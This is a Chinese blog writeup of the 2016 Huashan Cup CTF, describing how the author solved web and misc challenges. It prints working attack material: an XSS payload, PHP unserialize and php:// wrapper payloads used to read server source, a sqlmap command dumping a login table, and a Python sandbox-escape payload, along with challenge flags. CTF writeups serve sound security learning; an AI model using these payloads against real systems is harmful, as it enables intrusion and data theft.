title: 华山杯2016_writeup
date: 2016-9-11 17:20:27
tags:
- Blogs
- ctf
categories:
- Blogs
---

今年华山杯体验比去年要差一点儿...感觉太多的题目都很迷，其余几道比较不错的题目基本都是国外抄来的原题，甚至于文件读取的题目有洞，所有的题目又在一个环境下。。。导致各种非预期，整理下wp慢慢来吧...

![](/img/huashanbei2016/paiming.png)
![](/img/huashanbei2016/timu.png)

<!--more-->

# web #

## 打不过 ##

没什么意思的一题，返回头有str base64解码然后解md5

```
>>> base64.b64decode("OGM0MzU1NTc3MTdhMTQ4NTc4ZmQ4MjJhYWVmOTYwNzk=")
'8c435557717a148578fd822aaef96079'
```

flag is:flag_Xd{hSh_ctf:XD_aA@lvmM}

## 弹弹弹 ##

```
<img src=# onerror=alert`1`>
我正要测着呢，它就出来了。。。
```
flag_Xd{hSh_ctf:xsL98SsoX!}

## 系统管理 ##

查看页面源代码，获得提示。
username=s878926199a
得到user.php
```
$unserialize_str = $_POST['password']; $data_unserialize = unserialize($unserialize_str); if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???') { print_r($flag); }
```
构造序列化payload
```
a:2:{s:4:"user";s:3:"???";s:4:"pass";s:3:"???";}
```

flag_Xd{hSh_ctf:kidhvuensl^$}

## 疯狂的JS ##

题目里给代码，核心逻辑就一个函数，仔细分析一下就可以了，只不过无意中审计出了原题。

[https://github.com/bmaia/write-ups/blob/master/plaid-ctf-2014/halphow2js/README.md](https://github.com/bmaia/write-ups/blob/master/plaid-ctf-2014/halphow2js/README.md)

尝试构造出可行的 payload，在浏览器测试测试
filter(a,b,c,d,e)

flag_Xd{hSh_ctf:FKIE&ndG^ks@eJ}%

## php是最好的语言 ##

分析代码很容易想到是用伪协议

```php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
```

通过php://input 绕过Admin的限制，
通过php://filter 读取class.php

得到class.php的源码
```
<?php

class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}
?>
```

看到f1a9.php但是直接读不了，那么看一下index.php的源码

```
<?php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    if(preg_match("/f1a9/",$file)){
        exit();
    }else{
        include($file); //class.php
        $pass = unserialize($pass);7
        echo $pass;
    }
}else{
    echo "you are not admin ! ";
}

?>

<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->

```
发现有过滤，那么就序列化读源码吧

```
O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";} 
```

get flag

## 233 ##


Jsfuck跑了一下弹出来的字符串，识别出来是Windows下记事本的另类加密2333.

在windows记事本，保存成unicode，然后按ANSI打开即可。
得到一句话密码?% execute request("e@syt0g3t")%> 

提示:flag形式：flag_Xd{hSh_ctf:一句话密码}

```
flag_Xd{hSh_ctf:e@syt0g3t}
```

## 无间道 ##

原谅我真的不会做这个题，我这里传什么都不行，路径看不到完全没办法测试，无意中发现前面的题目可以读所有web题目的源码，那么就读来看看

```
GET /php/?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:54:"../62dd8d15b361f0f441e7/06acad5e2754f7e96d64/index.php";}  HTTP/1.1
Host: huashan.xdsec.cn
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://ctf.xidian.edu.cn/challenges
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: PHPSESSID=0703mqf0lmvfj661vrt7nqif44
Connection: close
Content-Length: 17

the user is admin

```

```
<?php
include_once('fun.php');
error_reporting(0);
echo "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />";
$date=getdate(time());
if(isset($_POST['submit'])){
	if(!empty($_FILES)){
        if($_FILES["file"]["error"] == 0){
        	
        	// File information
			$uploaded_name = $_FILES[ 'file' ][ 'name' ];
			$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
			$uploaded_type = $_FILES[ 'file' ][ 'type' ];
			$uploaded_size = $_FILES[ 'file' ][ 'size' ];
			if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
				( $uploaded_size < 100000 ) &&getimagesize( $uploaded_tmp ) ){
					if (file_exists("upload/" . $_FILES["file"]["name"])){
						echo $_FILES["file"]["name"] . " already exists. ";
    				}
    				else{
     					move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);
     					echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
						$ex=get_extension("upload/" . $_FILES["file"]["name"]);
			 
			 			if($ex===php){
							echo "flag_Xd{hSh_ctf:asu@3sud9:!}"; 
							unlink("upload/" . $_FILES["file"]["name"]);
			 			}
  					}
			}
			else{
				echo "<script>alert('xxxxx')</script>;";
				echo "<script type='text/javascript'>window.location.href='index.php'</script>";
			}
		}
	}
}	
?>


```

...

## Moretry ##

login 测试注入，测试发现role存在注入，那就简单了，掏出以前写的项目Feigong。

https://github.com/LoRexxar/Feigong

修改lib/Conpayload.py（36-39）为
```
for key in request:
	    if request[key] == 'Feigong':
	        request[key] = base64.b64encode(base64.b64encode(payload))
	return request
```
配置修改部分获得数据（已上传到github demo目录中）

得到
```
[*] Database websec Table sql_login content:
+----+----------+------------+---------------+
| id | username |   password |          role |
+----+----------+------------+---------------+
|  1 |     test |   test_123 |        Member |
|  2 |    admin | ADMIN_test | Administrator |
+----+----------+------------+---------------+
```

但是不知道为什么，可能是网络问题，一直注不到key，没办法，队友掏出了sqlmap配置tamper get

python sqlmap.py -u "http://huashan.xdsec.cn/62dd8d15b361f0f441e7/06acad5e2754f7e96d64/" --data "username=321&password=321&submit=1231&role=*" --dbms=mysql -D websec -T the_key --dump --tamper=doublebase64 --random-agent --technique=T -v 3 --level 3


Database: websec
Table: the_key
[1 entry]
+-------------------------------+
| key                           |
+-------------------------------+
| flag_Xd{hSh_ctf:sql_succeed!} |
+-------------------------------+

## 3秒钟记忆 ##


开始翻翻突然找到了原题，
[http://tasteless.eu/post/2014/04/plaidctf-2014-whatscat-writeup/](http://tasteless.eu/post/2014/04/plaidctf-2014-whatscat-writeup/)

得到脚本
http://pastebin.com/M7rcA3xK

题目不知道为什么特别的卡。。脚本完全跑不动。。跑了很久才得到flag

核心逻辑应该不难理解，二次注入处理导致的注入，仔细审计一下也能发现。


## 简单的js ##

没什么意思，进入页面 f12 看源码 复制中间的js代码  在console中运行 得到通关密码 填写密码 返回flag


# misc #

## 挣脱牢笼 ##

题目很质量，可惜是抄来的
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from sys import modules
modules.clear()
del modules

banned = [
    "import",
    "eval",
    "pickle",
    "os",
    "subprocess",
    "input",
    "banned",
    "sys"
]

_raw_input = raw_input
_Exception = Exception
__builtins__.__dict__.clear()
__builtins__ = None

while 1:
    data = _raw_input('>>>')
    for ban in banned:
        if ban.lower() in data.lower():
            print "!!!"
            break
    else:
        d = {'k':None}
        try:
            exec 'k='+data[:50] in d
            print d['k']
        except _Exception,e:
            print 'Exception:',
            raise e
```

原题来自[http://codezen.fr/2012/10/25/hack-lu-ctf-python-jail-writeup/](http://codezen.fr/2012/10/25/hack-lu-ctf-python-jail-writeup/)

这是我队友的payload
```
__builtins__['ak']=(1).__class__.__base__
__builtins__['ak']=ak.__subclasses__()
__builtins__['ak']=ak[40]
ak('flag.txt','r').read() 
```


剩下的题目没什么意思，就不谈了...